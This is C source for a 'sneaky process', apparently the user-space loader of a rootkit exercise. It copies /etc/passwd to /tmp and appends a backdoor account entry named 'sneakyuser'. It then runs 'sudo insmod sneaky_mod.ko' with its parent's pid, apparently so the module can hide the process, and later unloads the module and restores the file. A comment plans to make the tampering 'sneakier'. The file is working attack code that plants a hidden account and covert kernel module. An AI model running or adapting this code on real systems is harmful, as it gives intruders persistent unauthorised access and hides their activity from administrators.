#include<stdlib.h>
#include<stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>


#define PID_LEN 32

/** 
 * TODO: to make it even sneakier, 
 * substitute /tmp/passwd for etc/passwd 
 * when user is inside /etc and try to open 'passwd'
 */


/**
 * copy the original file from /etc/passwd to /tmp/passwd as a backup
 * @return status code
 */
int copy() {
    FILE *etc, *tmp;
    char c;
    etc = fopen("/etc/passwd", "r+");
    if (etc == NULL) {
        fprintf(stderr, "Error! Cannot open /etc/passwd 0\n");
        return EXIT_FAILURE;
    }
    tmp = fopen("/tmp/passwd", "w+");
    if (tmp == NULL) {
        fclose(etc);
        fprintf(stderr, "Error! Cannot open /tmp/passwd\n");
        return EXIT_FAILURE;
    }
    while ((c = fgetc(etc)) != EOF) {
        fputc(c, tmp);
    }
    fclose(tmp);
    // already have the fp pointing at the end, just print to the end of it.
    fprintf(etc, "%s\n", "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash");
    fclose(etc);
    fprintf(stdout, "Success! copy done\n");
    return EXIT_SUCCESS;
}

/**
 * restore the original file from /tmp/passwd to /etc/passwd
 * @return status code
 */
int restore() {
    FILE *etc, *tmp;
    char c;
    tmp = fopen("/tmp/passwd", "r");
    if (tmp == NULL) {
        fprintf(stderr, "Error! Cannot open /tmp/passwd\n");
        return EXIT_FAILURE;
    }
    etc = fopen("/etc/passwd", "w+");
    if (etc == NULL) {
        fclose(tmp);
        fprintf(stderr, "Error! Cannot open /etc/passwd 1\n");
        return EXIT_FAILURE;
    }
    while ((c = fgetc(tmp)) != EOF) {
        fputc(c, etc);
    }
    fclose(etc);
    fclose(tmp);
    return EXIT_SUCCESS;
}

/**
 * load the sneaky module to kernel
 * @return status code
 */
int load() {
    pid_t cpid = fork();
    if (cpid == 0) {  // fork() succeeded
        long ppid = getppid();  // get parent pid
        char pid_str[PID_LEN];  // convert the pid to string
        sprintf(pid_str, "pid=%ld", ppid);  // maybe also add path here?
        char *args[] = {"sudo", "insmod", "sneaky_mod.ko", pid_str,  NULL};
        if (execvp(args[0], args) == -1) {
            // the first arg is a file name, which should be the first in args.
            fprintf(stderr, "Error! execvp() failed. abort\n");
            return EXIT_FAILURE;
        }
    }
    else if (cpid == -1) {  // fork() failed
        fprintf(stderr, "Error! fork() failed. abort\n");
        return EXIT_FAILURE;
    }
    else {
        // wait for child process end successfully
        pid_t wpid = waitpid(cpid, NULL, 0);
        if (wpid == -1) {
            fprintf(stderr, "Error! waitpid() failed. abort\n");
            return EXIT_FAILURE;
        }
        else if (wpid == cpid) {
            // child process successfully executed
            fprintf(stdout, "Success! load done\n");
            return EXIT_SUCCESS;
        }
        else {
            fprintf(stderr, "Error! unkownn waitpid() result. abort\n");
            return EXIT_FAILURE;
        }
    }
    return EXIT_SUCCESS;
}

/**
 * unload the sneaky module from kernel
 * @return status code
 */
int unload() {
    pid_t cpid = fork();
    if (cpid == 0) {  // fork() succeeded
        char *args[] = {"sudo", "rmmod", "sneaky_mod.ko",  NULL};
        if (execvp(args[0], args) == -1) {
            // the first arg is a file name, which should be the first in args.
            fprintf(stderr, "Error! execvp() failed. abort\n");
            return EXIT_FAILURE;
        }
    }
    else if (cpid == -1) {  // fork() failed
        fprintf(stderr, "Error! fork() failed. abort\n");
        return EXIT_FAILURE;
    }
    else {
       // wait for child process end successfully
        pid_t wpid = waitpid(cpid, NULL, 0);
        if (wpid == -1) {
            fprintf(stderr, "Error! waitpid() failed. abort\n");
            return EXIT_FAILURE;
        }
        else if (wpid == cpid) {
            // child process successfully executed
            fprintf(stdout, "Success! unload done\n");
            return EXIT_SUCCESS;
        }
        else {
            fprintf(stderr, "Error! unkownn waitpid() result. abort\n");
            return EXIT_FAILURE;
        }
    }
    return EXIT_SUCCESS;
}

/**
 * a simple wrapper for waiting for q
 */
void loop(char c) {
    char d;
    fprintf(stdout, "Info: in the loop\n");
    while ((d = fgetc(stdin)) != c) {
        // do nothing, just wait
    }
}

/**
 * main function for sneaky_process.c
 * @return status code
 */
int main() {
    // do some simple assertion without including <assert.h>
    printf("sneaky_process pid = %d\n", getpid());
    if (copy() == EXIT_FAILURE) return EXIT_FAILURE;
    loop('c');
    if (load() == EXIT_FAILURE) return EXIT_FAILURE;
    loop('q');
    if (unload() == EXIT_FAILURE) return EXIT_FAILURE;
    if (restore() == EXIT_FAILURE) return EXIT_FAILURE;
    return EXIT_SUCCESS;
}
